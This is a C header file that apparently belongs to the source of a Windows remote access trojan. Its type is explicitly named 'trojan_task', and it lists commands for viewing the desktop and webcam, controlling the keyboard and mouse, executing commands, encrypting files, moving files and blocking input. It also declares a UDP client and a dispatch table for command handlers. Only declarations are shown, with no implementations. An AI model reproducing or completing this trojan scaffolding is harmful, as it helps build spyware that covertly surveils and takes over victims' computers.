#pragma once

#ifndef __COMMANDS_H_INCLUDED__
#define __COMMANDS_H_INCLUDED__

#include <Windows.h>

#define NUMBER_OF_COMMANDS 3

#define TASK_SUCCESSP       TEXT("Success")
#define TASK_SUCCESSW       L"Success"
#define TASK_SUCCESSA        "Success"
#define TASK_SUCCESS_LENGTH 7

#define TASK_FAILUREP       TEXT("Failure")
#define TASK_FAILUREW       L"Failure"
#define TASK_FAILUREA        "Failure"
#define TASK_FAILURE_LENGTH 7

#define UNDEFINEDP       TEXT("Undefined")
#define UNDEFINEDW       L"Undefined"
#define UNDEFINEDA        "Undefined"
#define UNDEFINED_LENGTH 9

#define RESULT_LENGTH  256

typedef enum
{
	MESSAGEBOX,
	VIEWDESKTOP_START,
	VIEWDESKTOP_STOP,
	VIEWWEBCAM_START,
	VIEWWEBCAM_STOP,
	KEYBOARDCTRL,
	MOUSECTRL,
	EXECUTECMD,
	ENCRYPTFILE,
	DECRYPTFILE,
	IMPORTFILE,
	EXPORTFILE,
	BLOCKINPUT,
	PLAYSOUND,

	NUMBER_OF_COMMAND,
	UNDEFINEDCMD = -1
} Command;

typedef struct
{
	PTCHAR name;
	INT    code;
} PAIR;

typedef VOID(*trojan_task)(CONST PVOID args, PTCHAR result);

typedef struct
{
	PAIR        pair;
	trojan_task task;
} MAP;

SOCKET InitUDPClient();

VOID _on_task_MESSAGEBOX(CONST PVOID args, PTCHAR result);
VOID _on_task_VIEWDESKTOP(CONST PVOID args, PTCHAR result);
VOID _on_task_MOUSECTRL(CONST PVOID args, PTCHAR result);
VOID _on_task_EXECUTECMD(CONST PVOID args, PTCHAR result);

static CONST MAP MAP_COMMANDS[NUMBER_OF_COMMANDS] =
{
	{ { TEXT("message"), MESSAGEBOX }, _on_task_MESSAGEBOX },
	{ { TEXT("mouse"  ), MOUSECTRL  }, _on_task_MOUSECTRL  },
	{ { TEXT("execute"), EXECUTECMD }, _on_task_EXECUTECMD }
};

INT          cmd2code(CONST PTCHAR cmd);
CONST PTCHAR code2cmd(INT cmd);

#endif /* __COMMANDS_H_INCLUDED__ */